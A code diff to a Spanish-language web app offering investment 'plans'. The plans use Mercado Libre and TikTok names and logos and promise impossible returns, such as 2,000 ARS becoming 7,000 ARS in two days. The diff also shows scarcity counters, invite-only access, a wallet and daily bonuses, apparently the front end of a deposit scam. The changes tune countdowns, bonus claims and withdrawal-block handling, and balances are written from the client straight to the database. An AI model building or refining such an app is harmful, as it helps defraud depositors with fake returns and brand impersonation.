@@ -112,7 +112,7 @@
     </div>
   </div>
 
-  <!-- PANTALLA DE ACCESO -->
+  <!-- PANTALLA DE ACCESO CON CASILLA DE INVITACIÓN VISIBLE -->
   <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
@@ -266,7 +266,7 @@
         <div id="active-products-container" class="space-y-3"></div>
       </div>
 
-      <!-- VISTA 3: COMPARTIR -->
+      <!-- VISTA 3: COMPARTIR (ESCALA LIMPIA) -->
       <div id="view-compartir" class="hidden p-3.5 space-y-4">
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex items-center gap-2.5">
@@ -477,7 +477,7 @@
       </button>
     </nav>
 
-    <!-- MODAL BILLETERA (RECARGA Y RETIRO) -->
+    <!-- MODAL BILLETERA -->
     <div id="wallet-modal" class="fixed inset-0 z-50 bg-[#020912]/85 backdrop-blur-md hidden flex items-center justify-center p-3">
       <div class="bg-[#0b1726] border border-sky-900/60 w-full max-w-sm rounded-3xl p-5 shadow-2xl space-y-4 text-slate-100">
         <div class="flex items-center justify-between border-b border-slate-800/80 pb-2.5">
@@ -700,6 +700,7 @@
       }
     }
 
+    // CATÁLOGO: 6 INICIALES Y 6 VIP CON ESCALA DE DÍAS EXTENDIDA
     const plans = [
       { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 100, slotsLeft: 64, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
       { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 100, slotsLeft: 58, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
@@ -952,7 +953,7 @@
       }).join('');
     }
 
-    // SINCRONIZACIÓN CORREGIDA: DESBLOQUEA RETIROS RECHAZADOS AUTOMÁTICAMENTE
+    // SINCRONIZACIÓN CORREGIDA Y ACTIVA
     async function sincronizarSaldoServidor() {
       if (!appState.phone) return;
       
@@ -975,11 +976,12 @@
         if (dbUser.cvu) appState.cvu = dbUser.cvu;
         if (dbUser.alias) appState.alias = dbUser.alias;
         if (dbUser.withdrawn !== undefined) appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
+        if (dbUser.last_claim !== undefined) appState.lastClaim = parseInt(dbUser.last_claim) || 0;
         if (dbUser.bank_verified !== undefined) {
           appState.bankVerified = dbUser.bank_verified === true;
         }
         
-        // Si en Supabase last_withdraw está en 0 o no tiene retiro pendiente, desbloquear interfaz
+        // Si en Supabase last_withdraw está en 0, limpiar bloqueo en el móvil
         if (dbUser.last_withdraw !== undefined && parseInt(dbUser.last_withdraw) === 0) {
           appState.lastWithdraw = 0;
           appState.lastWithdrawNet = 0;
@@ -990,6 +992,7 @@
         }
 
         saveLocal();
+        renderUI();
       }
     }
 
@@ -1009,7 +1012,7 @@
       }
     }
 
-    setInterval(sincronizarSaldoServidor, 5000);
+    setInterval(sincronizarSaldoServidor, 4000);
 
     window.handleAuthSubmit = async function() {
       const phoneInput = document.getElementById('auth-phone');
@@ -1086,7 +1089,8 @@
           appState.alias = dbUsers[0].alias || '';
           appState.withdrawn = parseFloat(dbUsers[0].withdrawn) || 0;
           appState.bankVerified = dbUsers[0].bank_verified === true;
-          
+          appState.lastClaim = parseInt(dbUsers[0].last_claim) || 0;
+
           if (dbUsers[0].last_withdraw !== undefined && parseInt(dbUsers[0].last_withdraw) === 0) {
             appState.lastWithdraw = 0;
             appState.lastWithdrawNet = 0;
@@ -1259,6 +1263,7 @@
       }
     };
 
+    // FORMATO DE CRONÓMETRO CORREGIDO (DÍAS + HORAS + MINUTOS)
     function renderProducts() {
       const container = document.getElementById('active-products-container');
       if (!container) return;
@@ -1297,10 +1302,12 @@
           statusBadge = '<span class="text-xs font-mono text-sky-700 bg-sky-50 border border-sky-200 px-2 py-0.5 rounded-md font-bold">Ciclo Completado ✓</span>';
           timeDisplay = '<span class="font-mono font-bold text-emerald-600 text-xs">Rendimientos acreditados</span>';
         } else {
-          const h = Math.floor(remaining / (1000 * 60 * 60));
+          const d = Math.floor(remaining / (1000 * 60 * 60 * 24));
+          const h = Math.floor((remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
           const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
           const s = Math.floor((remaining % (1000 * 60)) / 1000);
-          timeDisplay = `<span class="font-mono font-bold text-sky-800 text-sm">${h}h ${m}m ${s}s</span>`;
+          const dText = d > 0 ? `${d}d ` : '';
+          timeDisplay = `<span class="font-mono font-bold text-sky-800 text-sm">${dText}${h}h ${m}m ${s}s</span>`;
         }
 
         const card = document.createElement('div');
@@ -1343,21 +1350,23 @@
     }
     setInterval(renderProducts, 1000);
 
-    // CHECK-IN CON PERSISTENCIA EN SUPABASE
+    // CHECK-IN SINCRONIZADO
     document.getElementById('btn-claim-daily').addEventListener('click', async () => {
       const now = Date.now();
       if (now - appState.lastClaim < 24 * 60 * 60 * 1000) {
-        alert("Ya cobraste tu bono de hoy.");
+        const remainingHours = Math.ceil((24 * 60 * 60 * 1000 - (now - appState.lastClaim)) / (1000 * 60 * 60));
+        alert(`Ya cobraste tu bono diario. Podrás reclamar nuevamente en ${remainingHours} horas.`);
         return;
       }
       appState.balance += 500;
       appState.lastClaim = now;
       saveLocal();
+      renderUI();
       await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
         balance: appState.balance,
         last_claim: now 
       });
-      alert("¡+$500 ARS acreditados con éxito!");
+      alert("¡+$500 ARS acreditados con éxito a tu saldo!");
     });
 
     window.openWalletModal = function(mode) {
@@ -1951,10 +1960,31 @@
       document.getElementById('profile-withdrawn-ars').innerText = `$${fmt(appState.withdrawn)}`;
       document.getElementById('wallet-available-bal').innerText = `$${fmt(appState.balance)} ARS`;
 
-      // Si el retiro fue cancelado o lastWithdraw está en 0, ocultar la tarjeta
+      // Estado del check-in diario en el perfil
+      const checkinText = document.getElementById('checkin-status-text');
+      const checkinBtn = document.getElementById('btn-claim-daily');
+      const now = Date.now();
+      const diffClaim = now - (appState.lastClaim || 0);
+
+      if (diffClaim < 24 * 60 * 60 * 1000) {
+        const remH = Math.ceil((24 * 60 * 60 * 1000 - diffClaim) / (1000 * 60 * 60));
+        if (checkinText) checkinText.innerText = `Reclamado ✓ (Disponible en ${remH}h)`;
+        if (checkinBtn) {
+          checkinBtn.innerText = "Cobrado ✓";
+          checkinBtn.className = "px-4 py-2 bg-slate-200 text-slate-500 text-xs font-bold rounded-xl cursor-not-allowed";
+        }
+      } else {
+        if (checkinText) checkinText.innerText = "+$500 ARS listos para reclamar";
+        if (checkinBtn) {
+          checkinBtn.innerText = "Cobrar";
+          checkinBtn.className = "px-4 py-2 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-black rounded-xl transition shadow cursor-pointer";
+        }
+      }
+
+      // Tarjeta de retiro
       const withdrawBox = document.getElementById('active-withdraw-box');
       const withdrawText = document.getElementById('active-withdraw-text');
-      const diffWithdraw = Date.now() - (appState.lastWithdraw || 0);
+      const diffWithdraw = now - (appState.lastWithdraw || 0);
 
       if (appState.lastWithdraw > 0 && diffWithdraw < 24 * 60 * 60 * 1000 && appState.lastWithdrawNet > 0) {
         withdrawBox.classList.remove('hidden');
